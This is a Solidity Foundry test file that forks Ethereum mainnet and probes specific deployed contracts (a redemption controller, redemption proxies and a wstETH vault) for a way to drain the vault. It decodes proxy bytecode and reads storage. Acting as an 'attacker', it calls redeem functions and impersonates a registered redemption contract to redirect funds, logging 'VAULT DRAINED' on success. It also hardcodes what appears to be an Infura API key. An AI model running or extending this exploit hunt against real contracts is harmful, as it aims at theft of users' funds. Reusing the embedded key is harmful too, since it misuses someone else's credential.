// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract Slot4ProxyDeepDive is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;

    // Addresses found in REDEMPTION_1 storage
    address constant SLOT4_PROXY = 0xB38f2aCb7B562475908c0C6E80a045Deb4023f70;
    address constant SLOT5_IMPL = 0x434B68B11bBE8FD3074089397cA3d275801d6354;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_DecodeSlot4ProxyBytecode() public view {
        console.log("=== DECODING SLOT4_PROXY BYTECODE ===\n");

        // Bytecode: 608060405273ffffffffffffffffffffffffffffffffffffffff600054167fa619486e...
        // 60 80 - PUSH1 0x80
        // 60 40 - PUSH1 0x40
        // 52 - MSTORE (memory[0x40] = 0x80)
        // 73 ffffffffffffffffffffffffffffffffffffffff - PUSH20 0xFFFF...
        // 60 00 - PUSH1 0
        // 54 - SLOAD (load slot 0)
        // 16 - AND (mask with 0xFFFF... to get address)
        // 7f a619486e00000000000000000000000000000000000000000000000000000000 - PUSH32 selector
        // 60 00 - PUSH1 0
        // 35 - CALLDATALOAD (get first 32 bytes of calldata)
        // 14 - EQ (compare with selector)
        // 15 - ISZERO
        // 60 50 - PUSH1 0x50
        // 57 - JUMPI (jump to 0x50 if NOT the special selector)

        // If selector matches 0xa619486e:
        // 80 - DUP1 (duplicate address)
        // 60 00 - PUSH1 0
        // 52 - MSTORE
        // 60 20 - PUSH1 0x20
        // 60 00 - PUSH1 0
        // f3 - RETURN (return the implementation address)

        // Otherwise at 0x50:
        // 36 - CALLDATASIZE
        // 60 00 - PUSH1 0
        // 80 - DUP1
        // 37 - CALLDATACOPY
        // 60 00 - PUSH1 0
        // 80 - DUP1
        // 36 - CALLDATASIZE
        // 60 00 - PUSH1 0
        // 84 - DUP5 (address from slot 0)
        // 5a - GAS
        // f4 - DELEGATECALL
        // ...return handling

        console.log("Selector 0xa619486e is likely: implementation()");
        console.logBytes4(bytes4(keccak256("implementation()")));

        // Check SLOT4_PROXY's storage slot 0
        bytes32 slot0 = vm.load(SLOT4_PROXY, bytes32(uint256(0)));
        console.log("\nSLOT4_PROXY slot 0:");
        console.logBytes32(slot0);

        address impl = address(uint160(uint256(slot0)));
        console.log("Implementation address:", impl);
        console.log("Implementation code size:", impl.code.length);
    }

    function test_CheckImplementationOfSlot4() public view {
        console.log("=== CHECKING IMPLEMENTATION OF SLOT4_PROXY ===\n");

        // Call the implementation() function
        (bool success, bytes memory data) = SLOT4_PROXY.staticcall(
            abi.encodeWithSignature("implementation()")
        );

        if (success && data.length >= 32) {
            address impl = abi.decode(data, (address));
            console.log("implementation() returned:", impl);
            console.log("Impl code size:", impl.code.length);

            // Check this implementation's capabilities
            bytes memory implCode = impl.code;

            // Count opcodes
            uint delegatecallCount = 0;
            uint callCount = 0;

            for (uint i = 0; i < implCode.length; i++) {
                if (uint8(implCode[i]) == 0xf4) delegatecallCount++;
                if (uint8(implCode[i]) == 0xf1) callCount++;
            }

            console.log("\nImplementation DELEGATECALL count:", delegatecallCount);
            console.log("Implementation CALL count:", callCount);

            // Check if impl is registered in RC
            bytes32 rcSlot = keccak256(abi.encode(impl, uint256(4)));
            bytes32 isRegistered = vm.load(REDEMPTION_CONTROLLER, rcSlot);
            console.log("\nIs impl registered in RC?");
            console.logBytes32(isRegistered);
        } else {
            console.log("implementation() call failed or unexpected");

            // Try alternative selector
            (bool s2, bytes memory d2) = SLOT4_PROXY.staticcall(
                abi.encodeWithSelector(bytes4(0xa619486e))
            );
            if (s2) {
                console.log("0xa619486e returned:", abi.decode(d2, (address)));
            }
        }
    }

    function test_AnalyzeSlot5AsImplementation() public view {
        console.log("=== ANALYZING SLOT5_IMPL ===\n");

        // SLOT5_IMPL has 3 DELEGATECALLs and 13 SLOADs

        bytes memory code = SLOT5_IMPL.code;
        console.log("Code size:", code.length);

        // Find function selectors
        console.log("\nFunction selectors:");
        for (uint i = 0; i + 4 < code.length; i++) {
            if (uint8(code[i]) == 0x63) { // PUSH4
                bytes4 sel;
                sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));

                // Check for interesting selectors
                if (sel == bytes4(keccak256("redeem(uint256,address)"))) {
                    console.log("  Found redeem(uint256,address)!");
                }
                if (sel == bytes4(keccak256("finalizeRedeem(uint256)"))) {
                    console.log("  Found finalizeRedeem(uint256)!");
                }
                if (sel == bytes4(keccak256("execute(bytes)"))) {
                    console.log("  Found execute(bytes)!");
                }
            }
        }

        // Check storage
        console.log("\nSLOT5_IMPL storage:");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(SLOT5_IMPL, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("  Slot", i, ":");
                console.logBytes32(slot);
            }
        }

        // Is SLOT5_IMPL registered in RC?
        bytes32 rcSlot = keccak256(abi.encode(SLOT5_IMPL, uint256(4)));
        bytes32 isRegistered = vm.load(REDEMPTION_CONTROLLER, rcSlot);
        console.log("\nIs SLOT5_IMPL registered in RC?");
        console.logBytes32(isRegistered);
    }

    function test_TryCallingSlot4AsRedemption() public {
        console.log("=== TRYING SLOT4 AS REDEMPTION ENTRY ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBefore / 1e18);

        // Check SLOT4_PROXY's implementation
        bytes32 slot0 = vm.load(SLOT4_PROXY, bytes32(uint256(0)));
        address impl = address(uint160(uint256(slot0)));
        console.log("SLOT4 impl:", impl);

        // If SLOT4_PROXY delegatecalls to an impl that can call RC.redeem,
        // and we can manipulate what SLOT4_PROXY does...

        vm.startPrank(attacker);
        deal(IAU, attacker, 10000e18);
        IERC20(IAU).approve(SLOT4_PROXY, type(uint256).max);

        // Try calling SLOT4_PROXY with redemption-like functions
        console.log("\nTrying SLOT4_PROXY functions:");

        (bool s1,) = SLOT4_PROXY.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(100e18))
        );
        console.log("redeem(uint96):", s1);

        (bool s2,) = SLOT4_PROXY.call(
            abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
        );
        console.log("finalizeRedeem(uint256):", s2);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("\n*** VAULT DRAINED VIA SLOT4_PROXY! ***");
        }
    }

    function test_CheckRedWithinRedemption1Context() public view {
        console.log("=== REDEMPTION_1 DELEGATECALL CHAIN ===\n");

        // REDEMPTION_1 might delegatecall to SLOT4_PROXY or SLOT5_IMPL
        // Let's trace the flow

        // Check if REDEMPTION_1 uses SLOT4_PROXY's address in bytecode
        bytes memory code = REDEMPTION_1.code;

        bytes memory slot4Bytes = abi.encodePacked(SLOT4_PROXY);
        bytes memory slot5Bytes = abi.encodePacked(SLOT5_IMPL);

        console.log("Searching for SLOT4_PROXY in REDEMPTION_1 bytecode:");
        for (uint i = 0; i + 20 < code.length; i++) {
            bool match4 = true;
            bool match5 = true;
            for (uint j = 0; j < 20; j++) {
                if (code[i + j] != slot4Bytes[j]) match4 = false;
                if (code[i + j] != slot5Bytes[j]) match5 = false;
            }
            if (match4) {
                console.log("  Found SLOT4_PROXY at offset:", i);
            }
            if (match5) {
                console.log("  Found SLOT5_IMPL at offset:", i);
            }
        }

        // Check what REDEMPTION_1 stores in slots 4 and 5 (we know it's SLOT4/SLOT5)
        // These are READ from storage and used for delegatecall!
        console.log("\nREDEMPTION_1 loads addresses from storage for delegatecall");
        console.log("Slot 4 = SLOT4_PROXY =", SLOT4_PROXY);
        console.log("Slot 5 = SLOT5_IMPL =", SLOT5_IMPL);
    }

    function test_ExploitViaRedemption1Delegatecall() public {
        console.log("=== EXPLOIT VIA REDEMPTION_1 DELEGATECALL ===\n");

        // REDEMPTION_1 delegatecalls to address in storage slot 4 or 5
        // If we can somehow control that storage slot, we win

        // But since it's REDEMPTION_1's storage, can we manipulate it?
        // Only if there's a vulnerability in REDEMPTION_1 itself

        // Check if REDEMPTION_1 is a registered redemption
        bytes32 r1Slot = keccak256(abi.encode(REDEMPTION_1, uint256(4)));
        bytes32 isR1Registered = vm.load(REDEMPTION_CONTROLLER, r1Slot);
        console.log("Is REDEMPTION_1 registered in RC?");
        console.logBytes32(isR1Registered);

        // Try pranking as REDEMPTION_1 to call RC
        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        vm.startPrank(REDEMPTION_1);
        (bool success,) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 500e18, attacker)
        );
        vm.stopPrank();

        console.log("\nREDEMPTION_1 calling RC.redeem success:", success);

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("*** REDEMPTION_1 CAN DRAIN VAULT! ***");
            console.log("Drained:", (vaultBefore - vaultAfter) / 1e18, "wstETH");
        }
    }
}
